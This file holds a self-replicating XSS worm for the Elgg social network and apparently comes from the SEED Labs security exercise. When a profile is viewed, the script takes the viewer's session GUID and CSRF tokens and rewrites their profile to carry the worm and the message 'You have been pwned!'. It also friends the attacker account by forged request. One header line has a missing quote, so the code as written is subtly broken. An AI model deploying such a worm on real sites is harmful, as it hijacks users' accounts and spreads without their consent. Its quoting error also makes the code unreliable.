<script id="worm">
	window.onload = function() {
		var hTag = "<script id=\"worm\">";
		var innerCode = document.getElementById("worm").innerHTML;
		var tTag = "</" + "script>";
		
		var wormCode = encodeURIComponent(hTag + innerCode + tTag);
		
		var name = elgg.session.user.name;
		var guid = "&guid=" + elgg.session.user.guid;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		var briefDesc = "&briefdescription=You have been pwned!" + "&accesslevel[briefdescription]=2";
		var desc = "&description=" + wormCode + "&accesslevel[description]=2";
		
		var sendurlGET = "http://www.seed-server.com/action/friends/add?friend=59" + token + ts;
		var sendurlPOST = "http://www.seed-server.com/action/profile/edit";
		var content = name + guid + ts + token + briefDesc + desc;
		
		var attackerGuid = 59;
		if(elgg.session.user.guid != attackerGuid)
		{
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST", sendurlPOST, true);
			Ajax.setRequestHeader("Host", "www.seed-server.com");
			Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			Ajax.send(content);
			
			Ajax = new XMLHttpRequest();
			Ajax.open("GET", sendurlGET, true);
			Ajax.setRequestHeader(Host", "www.seed-server.com");
			Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			Ajax.send();
		}
	}
	</script>